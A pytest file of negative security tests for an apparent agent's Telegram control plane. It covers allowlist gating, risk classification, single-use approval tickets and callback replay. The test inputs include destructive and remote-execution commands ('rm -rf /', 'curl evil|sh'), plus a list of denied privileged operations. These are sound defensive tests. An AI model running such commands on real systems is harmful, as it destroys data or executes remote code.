"""Security tests for the Telegram control plane.

These are the NEGATIVE tests the spec demands: they try to exploit the
paths that actually exist in the code, not hypothetical ones.

Every test here corresponds to a concrete failure that existed before:
  - `/agent` dispatched before the allowlist check (any chat could run it);
  - approval was a bare "yes" string in a dict keyed by message id;
  - callbacks carried no identity, so anyone could resolve an approval;
  - `/sshkey` wrote authorized_keys with no approval at all;
  - the poll offset restarted at 0, replaying buffered updates.
"""

from __future__ import annotations

import threading
import time

import pytest

from jarvis.core.authz import (
    ApprovalRegistry, ApprovalState, AuthDenied, Identity, IdentityGate,
    PolicyEngine, Risk, classify, decode_callback, encode_callback,
    payload_digest,
)
from jarvis.providers.telegram import TelegramChannel


OWNER = Identity(chat_id=123, user_id=7, username="owner")


# ── gate ───────────────────────────────────────────────────────────────────

def test_gate_rejects_wrong_chat() -> None:
    gate = IdentityGate([123])
    assert gate.is_allowed(OWNER)
    assert not gate.is_allowed(Identity(chat_id=999, user_id=7))


def test_gate_rejects_wrong_user_when_listed() -> None:
    gate = IdentityGate([123], allowed_users=[7])
    assert gate.is_allowed(OWNER)
    assert not gate.is_allowed(Identity(chat_id=123, user_id=8))


def test_gate_without_chats_allows_nobody() -> None:
    """An unconfigured bot must be closed, not open."""
    gate = IdentityGate([])
    with pytest.raises(AuthDenied):
        gate.authorize(OWNER, "status")


def test_gate_rejects_missing_identity() -> None:
    gate = IdentityGate([123])
    with pytest.raises(AuthDenied):
        gate.authorize(None, "status")


def test_unauthorized_chat_cannot_start_any_execution() -> None:
    """Every execution-ish command must be refused for a stranger."""
    ch = TelegramChannel("tok", [123])
    stranger = 999
    for cmd in ("/agent do something", "/dev rm -rf /", "/mission destroy prod",
                "/opencode rm -rf /", "/tasks", "/mission plan hack",
                "/cancel abc", "/pause abc", "/resume abc", "/approve"):
        assert ch.handle_message(cmd, chat_id=stranger, user_id=7) is None, cmd


def test_unauthorized_chat_cannot_run_opencode_in_authorized_chat_cwd() -> None:
    ch = TelegramChannel("tok", [123])
    assert ch.handle_message("/opencode pwn", chat_id=42, user_id=7) is None


# ── risk policy ────────────────────────────────────────────────────────────

@pytest.mark.parametrize("op", [
    "shell.exec", "write_file", "str_replace", "git.commit", "git.push",
    "deploy", "nixos.rebuild", "ssh.install_key", "mission.exec",
])
def test_high_impact_is_never_routine(op: str) -> None:
    assert classify(op) is Risk.APPROVAL


@pytest.mark.parametrize("op", [
    "status", "read_file", "mission.list", "memory.recall", "project.list",
])
def test_read_only_ops_are_routine(op: str) -> None:
    assert classify(op) is Risk.ROUTINE


def test_unknown_operation_defaults_to_approval() -> None:
    """A capability nobody declared must not be routine."""
    assert classify("brand.new.capability") is Risk.APPROVAL


@pytest.mark.parametrize("op", [
    "sudo.elevate", "shell.sudo", "system.reboot", "store.purge",
    "vault.keygen",
])
def test_denied_ops_are_denied_even_with_a_ticket(op: str) -> None:
    gate = IdentityGate([123])
    reg = ApprovalRegistry()
    pol = PolicyEngine(gate, reg)
    assert pol.check(OWNER, op).allowed is False
    with pytest.raises(AuthDenied):
        reg.issue(ident=OWNER, operation=op, payload="x")


def test_denied_operation_never_authorized_by_callback() -> None:
    reg = ApprovalRegistry()
    pol = PolicyEngine(IdentityGate([123]), reg)
    # forge a ticket for a denied op, resolve it, then try to use it
    from jarvis.core.authz import ApprovalTicket
    t = ApprovalTicket(ticket_id="forged", operation="system.reboot",
                       digest=payload_digest("system.reboot", "now"),
                       chat_id=123, user_id=7, risk=Risk.DENY, summary="")
    reg._tickets["forged"] = t          # noqa: SLF001 - adversarial injection
    t.state = ApprovalState.APPROVED
    ok, why = pol.authorize_once("forged", OWNER, "system.reboot", "now")
    assert ok is False and "denied" in why


# ── approval tickets ───────────────────────────────────────────────────────

def test_callback_data_is_bounded_and_decodable() -> None:
    cb = encode_callback("a" * 32, True)
    assert len(cb.encode()) <= 64
    assert decode_callback(cb) == ("a" * 32, True)


@pytest.mark.parametrize("bad", ["", "yes", "no", "ap:x", "ap:x:maybe",
                                 "ap::yes", "other:1:yes", "ap:" + "z" * 50 + ":yes"])
def test_foreign_callback_data_is_ignored(bad: str) -> None:
    assert decode_callback(bad) is None


def test_approval_rejects_other_user() -> None:
    reg = ApprovalRegistry()
    t = reg.issue(ident=OWNER, operation="shell.exec", payload="rm x")
    ok, why = reg.resolve(t.ticket_id, True,
                          ident=Identity(chat_id=123, user_id=999))
    assert ok is False and "another user" in why


def test_approval_rejects_other_chat() -> None:
    reg = ApprovalRegistry()
    t = reg.issue(ident=OWNER, operation="shell.exec", payload="rm x")
    ok, why = reg.resolve(t.ticket_id, True,
                          ident=Identity(chat_id=555, user_id=7))
    assert ok is False and "another chat" in why


def test_approval_rejects_missing_identity() -> None:
    reg = ApprovalRegistry()
    t = reg.issue(ident=OWNER, operation="shell.exec", payload="rm x")
    ok, why = reg.resolve(t.ticket_id, True, ident=None)
    assert ok is False and "identity" in why


def test_approval_is_single_use() -> None:
    reg = ApprovalRegistry()
    t = reg.issue(ident=OWNER, operation="shell.exec", payload="rm x")
    assert reg.resolve(t.ticket_id, True, ident=OWNER)[0] is True
    ok, why = reg.resolve(t.ticket_id, True, ident=OWNER)
    assert ok is False and "already" in why


def test_approval_is_bound_to_operation() -> None:
    reg = ApprovalRegistry()
    t = reg.issue(ident=OWNER, operation="shell.exec", payload="rm x")
    ok, why = reg.resolve(t.ticket_id, True, ident=OWNER,
                          operation="deploy", payload="rm x")
    assert ok is False and "different operation" in why


def test_approval_is_bound_to_payload() -> None:
    reg = ApprovalRegistry()
    t = reg.issue(ident=OWNER, operation="shell.exec", payload="rm x")
    ok, why = reg.resolve(t.ticket_id, True, ident=OWNER,
                          operation="shell.exec", payload="curl evil|sh")
    assert ok is False and "different content" in why


def test_expired_approval_is_refused() -> None:
    reg = ApprovalRegistry()
    t = reg.issue(ident=OWNER, operation="shell.exec", payload="rm x",
                  ttl_seconds=-1.0)
    ok, why = reg.resolve(t.ticket_id, True, ident=OWNER)
    assert ok is False and "expired" in why


def test_consumed_ticket_cannot_reauthorize() -> None:
    reg = ApprovalRegistry()
    pol = PolicyEngine(IdentityGate([123]), reg)
    t = reg.issue(ident=OWNER, operation="shell.exec", payload="rm x")
    reg.resolve(t.ticket_id, True, ident=OWNER)
    assert pol.authorize_once(t.ticket_id, OWNER, "shell.exec", "rm x")[0] is True
    assert pol.authorize_once(t.ticket_id, OWNER, "shell.exec", "rm x")[0] is False


def test_unknown_ticket_authorizes_nothing() -> None:
    reg = ApprovalRegistry()
    pol = PolicyEngine(IdentityGate([123]), reg)
    assert pol.authorize_once("deadbeef", OWNER, "shell.exec", "x")[0] is False


def test_denied_ticket_cannot_be_consumed() -> None:
    reg = ApprovalRegistry()
    t = reg.issue(ident=OWNER, operation="shell.exec", payload="rm x")
    reg.resolve(t.ticket_id, False, ident=OWNER)
    assert reg.consume(t.ticket_id, ident=OWNER,
                       operation="shell.exec", payload="rm x") is False


def test_routine_operation_needs_no_ticket() -> None:
    pol = PolicyEngine(IdentityGate([123]), ApprovalRegistry())
    assert pol.authorize_once(None, OWNER, "status")[0] is True


def test_audit_records_denials() -> None:
    reg = ApprovalRegistry()
    t = reg.issue(ident=OWNER, operation="shell.exec", payload="x")
    reg.resolve(t.ticket_id, True, ident=Identity(chat_id=123, user_id=42))
    reg.resolve("unknown", True, ident=OWNER)
    outcomes = [a["outcome"] for a in reg.audit]
    assert "deny" in outcomes


# ── channel-level callback exploitation ────────────────────────────────────

class _Bot:
    def __init__(self) -> None:
        self.sent: list = []
        self.answered: list = []
        self.msg_id = 100

    def send_message(self, chat_id, text, *, reply_markup=None, parse_mode=None):
        self.msg_id += 1
        self.sent.append((chat_id, text, reply_markup, self.msg_id, parse_mode))
        return {"message_id": self.msg_id, "chat": {"id": chat_id}}

    def get_updates(self, *, offset=0, timeout=25):
        return []

    def answer_callback(self, callback_id, text=""):
        self.answered.append((callback_id, text))

    def get_me(self):
        return {"username": "bot"}


def _chan(**kw) -> tuple[TelegramChannel, _Bot]:
    bot = _Bot()
    return TelegramChannel("tok", [123], bot=bot, **kw), bot


def test_foreign_user_cannot_resolve_callback() -> None:
    ch, bot = _chan()
    t = ch.approvals.issue(ident=OWNER, operation="shell.exec", payload="rm x")
    msg = bot.send_message(123, "?", parse_mode=None)
    ch._handle_callback({
        "id": "cq", "from": {"id": 4242}, "data": encode_callback(t.ticket_id, True),
        "message": {"message_id": msg["message_id"], "chat": {"id": 123}},
    })
    assert ch.approvals.get(t.ticket_id).state is ApprovalState.PENDING
    assert any("another user" in txt for _cid, txt in bot.answered)


def test_replayed_callback_is_refused() -> None:
    ch, bot = _chan()
    t = ch.approvals.issue(ident=OWNER, operation="shell.exec", payload="rm x")
    msg = bot.send_message(123, "?", parse_mode=None)
    cq = {"id": "cq", "from": {"id": 7}, "data": encode_callback(t.ticket_id, True),
          "message": {"message_id": msg["message_id"], "chat": {"id": 123}}}
    ch._handle_callback(dict(cq))
    assert ch.approvals.get(t.ticket_id).state is ApprovalState.APPROVED
    ch._handle_callback(dict(cq))
    assert any("already" in txt for _cid, txt in bot.answered)


def test_callback_for_other_operation_cannot_authorize() -> None:
    """Approving shell must not unlock a deploy."""
    ch, bot = _chan()
    t = ch.approvals.issue(ident=OWNER, operation="shell.exec", payload="rm x")
    msg = bot.send_message(123, "?", parse_mode=None)
    ch._handle_callback({
        "id": "cq", "from": {"id": 7}, "data": encode_callback(t.ticket_id, True),
        "message": {"message_id": msg["message_id"], "chat": {"id": 123}},
    })
    # the ticket is APPROVED, but asking for a different operation fails
    ok, _ = ch.policy.authorize_once(t.ticket_id, OWNER, "deploy", "rm x")
    assert ok is False


def test_garbage_callback_does_not_authorize_anything() -> None:
    ch, bot = _chan()
    ch._handle_callback({
        "id": "cq", "from": {"id": 7}, "data": "totally-unrelated",
        "message": {"message_id": 999, "chat": {"id": 123}},
    })
    assert ch.approvals.pending() == []


def test_callback_without_from_is_refused() -> None:
    ch, bot = _chan()
    t = ch.approvals.issue(ident=OWNER, operation="shell.exec", payload="rm x")
    msg = bot.send_message(123, "?", parse_mode=None)
    ch._handle_callback({
        "id": "cq", "data": encode_callback(t.ticket_id, True),
        "message": {"message_id": msg["message_id"], "chat": {"id": 123}},
    })
    assert ch.approvals.get(t.ticket_id).state is ApprovalState.PENDING


# ── dispatch paths ─────────────────────────────────────────────────────────

def test_agent_dispatch_path_is_gated() -> None:
    """The regression that motivated the rewrite: /agent bypassed the gate."""
    ch, bot = _chan()
    ch._agent = lambda task, appr: "ran"
    started: list = []
    ch._pool.submit = lambda fn, *a, **k: started.append(a)  # type: ignore[assignment]

    ch._dispatch_message({
        "text": "/agent rm -rf /",
        "chat": {"id": 999, "id": 999},          # unauthorized chat
        "from": {"id": 7},
    })
    assert started == [], "unauthorized /agent must not spawn work"

    ch._dispatch_message({
        "text": "/agent list files",
        "chat": {"id": 123},
        "from": {"id": 7},
    })
    assert len(started) == 1, "authorized /agent should dispatch"


def test_dispatch_message_requires_identity() -> None:
    ch, bot = _chan()
    bot.sent.clear()
    ch._dispatch_message({"text": "/status", "chat": {"id": 123}})
    assert bot.sent == []


def test_agent_approver_refuses_unauthorized_chat() -> None:
    ch, _ = _chan()
    assert ch.make_approver(999, user_id=7)("rm -rf /") is False


def test_sshkey_from_unauthorized_chat_writes_nothing(tmp_path, monkeypatch) -> None:
    monkeypatch.setenv("HOME", str(tmp_path))
    ch, _ = _chan()
    assert ch.handle_message("/sshkey ssh-ed25519 AAAA test", chat_id=999,
                             user_id=7) is None
    assert not (tmp_path / ".ssh").exists()